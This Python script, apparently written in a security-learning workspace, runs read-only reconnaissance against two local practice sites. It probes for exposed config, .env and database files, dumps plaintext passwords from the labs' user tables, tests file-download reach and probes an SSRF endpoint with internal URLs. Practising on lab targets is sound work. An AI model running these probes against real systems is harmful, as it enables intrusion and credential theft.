#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""recon-08: 靶场 B (8091) 只读指纹 + 目录/文件探测 + 两个靶场的 admin 口令对照。"""
import sys, re, json, sqlite3, urllib.request, urllib.error, urllib.parse

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
B = "http://127.0.0.1:8091"
A = "http://127.0.0.1:8095"
EV = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence"
NR = urllib.request.build_opener(type("NR", (urllib.request.HTTPRedirectHandler,), {
    "redirect_request": lambda *a, **k: None}))


def get(url, cookie=None, method="GET", form=None):
    r = urllib.request.Request(url, method=method)
    if cookie:
        r.add_header("Cookie", cookie)
    d = None
    if form is not None:
        d = urllib.parse.urlencode(form).encode()
        r.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with NR.open(r, data=d, timeout=12) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()


print("=" * 100)
print("靶场 B (8091) 探测路由")
B_PATHS = ["/", "/login", "/register", "/profile", "/logout", "/change-password",
           "/api/profile?id=1", "/api/profile", "/api/orders?id=1",
           "/admin/users", "/debug", "/backup/config.bak", "/config.bak",
           "/target_site.db", "/audit.log", "/audit.log.1", "/lab.db",
           "/download?file=readme.txt", "/uploads/", "/favicon.ico",
           "/robots.txt", "/server-status", "/.env"]
for p in B_PATHS:
    st, h, raw = get(B + p)
    m2 = re.search(rb"<title>(.*?)</title>", raw, re.S)
    title = m2.group(1).decode("utf-8", "replace") if m2 else ""
    print(f"  GET {p:28} -> {st:4} len={len(raw):6} loc={h.get('Location','')[:20]:20} "
          f"title={title[:22]}")

print()
print("=" * 100)
print("靶场 B 登录页（找测试账号提示 + CSRF）")
st, h, raw = get(B + "/login")
txt = raw.decode("utf-8", "replace")
print(f"  status={st} SetCookie={h.get('Set-Cookie','')[:60]} 含csrf={'csrf_token' in txt}")
for m in re.finditer(r"<td>([^<]{1,20})</td>", txt):
    print("   td:", m.group(1))

print()
print("=" * 100)
print("两个靶场的库口令对照（离线只读）")
base = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
for name, db, tab in [("A target-site-lab", base + r"\target-site-lab\lab.db", "users"),
                      ("B target-site", base + r"\target-site\target_site.db", "users")]:
    print(f"  --- {name}: {db}")
    try:
        c = sqlite3.connect("file:" + db + "?mode=ro", uri=True)
        c.row_factory = sqlite3.Row
        cols = [r[1] for r in c.execute(f"PRAGMA table_info({tab})")]
        print("      columns:", cols)
        for r in c.execute(f"SELECT * FROM {tab}"):
            d = dict(r)
            d.pop("password_hash", None)
            d.pop("password_salt", None)
            if "password" in d and d["password"]:
                d["password"] = d["password"] + "   <-- 明文"
            print("     ", d)
        for t in ("sessions", "login_attempts", "coupon_claims", "orders"):
            try:
                n = c.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
                print(f"      {t}: {n} 行")
            except Exception as e:
                print(f"      {t}: 不存在 ({e})")
        c.close()
    except Exception as e:
        print("      ERR:", e)

print()
print("=" * 100)
print("A 站 /download 白名单可达性（只读下载，不改任何数据）")
for f in ["readme.txt", "app.py", "config.bak", "lab.db", "1.bak", "x.txt"]:
    st, h, raw = get(A + "/download?file=" + urllib.parse.quote(f))
    print(f"  /download?file={f:12} -> {st:4} len={len(raw):6} "
          f"cd={h.get('Content-Disposition','')[:40]}")

print()
print("=" * 100)
print("A 站 /uploads/ 目录列表 & 已有文件（只读 GET，不写入）")
for f in ["", "escape.txt", "poc.txt", "index.html"]:
    st, h, raw = get(A + "/uploads/" + f)
    print(f"  GET /uploads/{f:12} -> {st:4} len={len(raw):6} "
          f"ctype={h.get('Content-Type','')[:28]:28} cd={h.get('Content-Disposition','')[:34]}")
st, h, raw = get(A + "/uploads/escape.txt")
print("  escape.txt 内容:", raw[:80])

print()
print("=" * 100)
print("A 站 /fetch SSRF 边界")
for u in ["http://127.0.0.1:8095/", "http://127.0.0.1:8095/debug",
          "http://127.0.0.1:8091/", "http://127.0.0.1:22/",
          "http://127.0.0.1:8095/backup/config.bak", "http://example.com/",
          "http://127.0.0.1:8095/fetch?url=http://127.0.0.1:8095/"]:
    st, h, raw = get(A + "/fetch?url=" + urllib.parse.quote(u, safe=""))
    m2 = re.search(rb"<h1>(.*?)</h1>", raw, re.S)
    t = m2.group(1).decode("utf-8", "replace")[:40] if m2 else ""
    print(f"  /fetch url={u:52} -> {st:4} len={len(raw):6} h1={t}")
